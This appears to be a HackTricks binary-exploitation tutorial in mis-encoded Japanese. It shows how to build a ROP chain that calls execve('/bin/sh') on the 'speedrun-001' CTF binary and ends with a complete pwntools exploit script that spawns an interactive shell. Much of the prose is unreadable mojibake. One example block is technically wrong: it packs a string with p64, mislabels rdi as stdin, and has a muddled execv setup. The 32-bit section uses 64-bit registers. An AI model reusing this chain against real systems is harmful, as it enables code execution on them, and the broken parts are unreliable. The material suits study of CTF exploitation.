# ROP - sys_execveã®å‘¼ã³å‡ºã—

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

**ã‚·ã‚¹ã‚³ãƒ¼ãƒ«**ã®å‘¼ã³å‡ºã—ã®æº–å‚™ã«ã¯ã€æ¬¡ã®è¨­å®šãŒå¿…è¦ã§ã™ï¼š

* `rax: 59 sys_execveã‚’æŒ‡å®šã—ã¾ã™`
* `rdi: "/bin/sh"ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã‚’æŒ‡å®šã—ã¾ã™`
* `rsi: 0 å¼•æ•°ã¯æ¸¡ã•ã‚Œã¾ã›ã‚“`
* `rdx: 0 ç’°å¢ƒå¤‰æ•°ã¯æ¸¡ã•ã‚Œã¾ã›ã‚“`

ã—ãŸãŒã£ã¦ã€åŸºæœ¬çš„ã«ã¯æ–‡å­—åˆ—`/bin/sh`ã‚’ã©ã“ã‹ã«æ›¸ãè¾¼ã¿ã€ãã®å¾Œã§`syscall`ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼‰ã€‚

## ãƒ¬ã‚¸ã‚¹ã‚¿ã®åˆ¶å¾¡

ã¾ãšã€**ã“ã‚Œã‚‰ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’åˆ¶å¾¡ã™ã‚‹æ–¹æ³•**ã‚’è¦‹ã¤ã‘ã¾ã—ã‚‡ã†ï¼š
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ã“ã‚Œã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€**ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æ›¸ãè¾¼ã¿ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã«ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

## æ–‡å­—åˆ—ã®æ›¸ãè¾¼ã¿

### æ›¸ãè¾¼ã¿å¯èƒ½ãªãƒ¡ãƒ¢ãƒª

ã¾ãšã€ãƒ¡ãƒ¢ãƒªå†…ã®æ›¸ãè¾¼ã¿å¯èƒ½ãªå ´æ‰€ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### æ–‡å­—åˆ—ã®æ›¸ãè¾¼ã¿

æ¬¡ã«ã€ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä»»æ„ã®å†…å®¹ã‚’æ›¸ãè¾¼ã‚€æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 ãƒ“ãƒƒãƒˆ

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) ã¯ã€å®Ÿè¡Œå¯èƒ½ãªã‚³ãƒ¼ãƒ‰ã®æ–­ç‰‡ï¼ˆã‚¬ã‚¸ã‚§ãƒƒãƒˆï¼‰ã‚’çµ„ã¿åˆã‚ã›ã¦æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹æ‰‹æ³•ã§ã™ã€‚ã“ã‚Œã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’åˆ¶å¾¡ã—ã€æ”»æ’ƒè€…ãŒä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

##### ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®åˆ©ç”¨

ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã¯ã€ã‚«ãƒ¼ãƒãƒ«ã®æ©Ÿèƒ½ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã—ã¦ç‰¹æ¨©ã®ã‚ã‚‹æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ROP ã‚’ä½¿ç”¨ã—ã¦ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

##### execv ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«

execv ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã¯ã€æ–°ã—ã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ROP ã‚’ä½¿ç”¨ã—ã¦ execv ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§ã€ä»»æ„ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

##### ROP ã‚’ä½¿ç”¨ã—ãŸ execv ã®å‘¼ã³å‡ºã—

ROP ã‚’ä½¿ç”¨ã—ã¦ execv ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. execv ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã€‚
2. execv ã®å¼•æ•°ã‚’è¨­å®šã™ã‚‹ã€‚
3. execv ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã€‚
4. ROP ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ§‹ç¯‰ã™ã‚‹ã€‚
5. ROP ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã€‚

##### execv ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æ¢ç´¢

execv ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¢ã™ãŸã‚ã«ã¯ã€libc ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã®ã‚·ãƒ³ãƒœãƒ«ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’èª¿æŸ»ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€libc ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã€ãã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ execv ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¨ˆç®—ã™ã‚‹ã“ã¨ã§ã™ã€‚

##### execv ã®å¼•æ•°ã®è¨­å®š

execv ã®å¼•æ•°ã¯ã€å®Ÿè¡Œã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ‘ã‚¹ã¨å¼•æ•°ã®é…åˆ—ã§ã™ã€‚ã“ã‚Œã‚‰ã®å¼•æ•°ã‚’é©åˆ‡ã«è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

##### execv ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ¢ç´¢

execv ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æ¢ã™ãŸã‚ã«ã¯ã€ãƒã‚¤ãƒŠãƒªå†…ã®æœ‰åŠ¹ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã€ret å‘½ä»¤ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’åˆ¶å¾¡ã—ã¾ã™ã€‚

##### ROP ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®æ§‹ç¯‰

ROP ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨å¼•æ•°ã®å€¤ã‚’çµ„ã¿åˆã‚ã›ã¦æ§‹ç¯‰ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€execv ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ãŒå‘¼ã³å‡ºã•ã‚Œã€ä»»æ„ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

##### ROP ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å®Ÿè¡Œ

ROP ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€æ”»æ’ƒè€…ã¯ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã«ROP ãƒã‚§ãƒ¼ãƒ³ã‚’é…ç½®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 ãƒ“ãƒƒãƒˆ

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®æ—¢å­˜ã®ã‚³ãƒ¼ãƒ‰æ–­ç‰‡ï¼ˆã‚¬ã‚¸ã‚§ãƒƒãƒˆï¼‰ã‚’çµ„ã¿åˆã‚ã›ã¦æ”»æ’ƒè€…ãŒä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ‰‹æ³•ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒ¼ã‚¿é ˜åŸŸã¸ã®æ›¸ãè¾¼ã¿ã‚„å®Ÿè¡Œæ¨©é™ã®ãªã„ãƒ¡ãƒ¢ãƒªé ˜åŸŸã¸ã®ã‚¸ãƒ£ãƒ³ãƒ—ãªã©ã€åˆ¶ç´„ã®ã‚ã‚‹ç’°å¢ƒã§ã®æ”»æ’ƒã«æœ‰åŠ¹ã§ã™ã€‚

ROP ãƒã‚§ãƒ¼ãƒ³ã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç‰¹å®šã™ã‚‹
2. ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã«é…ç½®ã™ã‚‹
3. ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã‹ã‚‰å‘¼ã³å‡ºã™

ROP ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®æ—¢å­˜ã®ã‚³ãƒ¼ãƒ‰ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã€å®Ÿè¡Œæ¨©é™ã®ãªã„ãƒ¡ãƒ¢ãƒªé ˜åŸŸã§ã‚‚æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

##### ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®åˆ©ç”¨

ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã¯ã€ã‚«ãƒ¼ãƒãƒ«ã®æ©Ÿèƒ½ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã—ã¦ç‰¹æ¨©ã®ã‚ã‚‹æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®ç•ªå·ã‚’ç‰¹å®šã™ã‚‹
2. ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®å¼•æ•°ã‚’è¨­å®šã™ã‚‹
3. ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™

ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ç‰¹æ¨©ã®ã‚ã‚‹æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

##### execve ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«

execve ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã¯ã€æ–°ã—ã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€execve ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã—ã¦ä»»æ„ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

execve ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ‘ã‚¹ã‚’æŒ‡å®šã™ã‚‹
2. ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³å¼•æ•°ã‚’è¨­å®šã™ã‚‹
3. ç’°å¢ƒå¤‰æ•°ã‚’è¨­å®šã™ã‚‹
4. execve ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™

execve ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## ä¾‹

The following example demonstrates how to use ROP to execute the `execv` system call in Linux.

ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€ROPã‚’ä½¿ç”¨ã—ã¦Linuxã§`execv`ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

```python
from pwn import *

# Set up the target process
target = process('/path/to/vulnerable/program')

# Find gadgets using ROPgadget
pop_rdi = 0x000000000040123b  # pop rdi; ret;
pop_rsi_r15 = 0x0000000000401239  # pop rsi; pop r15; ret;
execv_addr = 0x0000000000401030  # address of execv function

# Build the ROP chain
rop_chain = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64('/bin/sh\x00') + p64(0) + p64(execv_addr)

# Send the ROP chain to the target process
target.sendline(rop_chain)

# Interact with the target process
target.interactive()
```

The example above demonstrates a basic ROP chain that uses two gadgets (`pop rdi; ret;` and `pop rsi; pop r15; ret;`) to set up the arguments for the `execv` system call. The address of the `execv` function is obtained using a tool like ROPgadget.

ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€`pop rdi; ret;`ã¨`pop rsi; pop r15; ret;`ã®2ã¤ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€`execv`ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®å¼•æ•°ã‚’è¨­å®šã™ã‚‹åŸºæœ¬çš„ãªROPãƒã‚§ãƒ¼ãƒ³ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚`execv`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã€ROPgadgetã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦å–å¾—ã•ã‚Œã¾ã™ã€‚

The ROP chain is built by concatenating the addresses of the gadgets and the arguments for the `execv` system call. In this example, the ROP chain sets the `rdi` register to 0 (which represents the file descriptor for `stdin`), the `rsi` register to the address of the string "/bin/sh\x00" (which represents the command to be executed), and the `r15` register to 0. Finally, the address of the `execv` function is appended to the ROP chain.

ROPãƒã‚§ãƒ¼ãƒ³ã¯ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨`execv`ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã®å¼•æ•°ã‚’é€£çµã—ã¦æ§‹ç¯‰ã•ã‚Œã¾ã™ã€‚ã“ã®ä¾‹ã§ã¯ã€ROPãƒã‚§ãƒ¼ãƒ³ã¯`rdi`ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’0ï¼ˆ`stdin`ã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ã‚’è¡¨ã™ï¼‰ã«è¨­å®šã—ã€`rsi`ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’æ–‡å­—åˆ—"/bin/sh\x00"ï¼ˆå®Ÿè¡Œã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’è¡¨ã™ï¼‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«è¨­å®šã—ã€`r15`ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’0ã«è¨­å®šã—ã¾ã™ã€‚æœ€å¾Œã«ã€`execv`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒROPãƒã‚§ãƒ¼ãƒ³ã«è¿½åŠ ã•ã‚Œã¾ã™ã€‚

The ROP chain is then sent to the target process, which will execute the `execv` system call with the specified arguments. This will result in the execution of the `/bin/sh` shell, providing an interactive shell to the attacker.

ãã®å¾Œã€ROPãƒã‚§ãƒ¼ãƒ³ã¯æŒ‡å®šã•ã‚ŒãŸå¼•æ•°ã§`execv`ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ—ãƒ­ã‚»ã‚¹ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã«å¯¾ã—ã¦å¯¾è©±å‹ã‚·ã‚§ãƒ«ã‚’æä¾›ã™ã‚‹`/bin/sh`ã‚·ã‚§ãƒ«ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
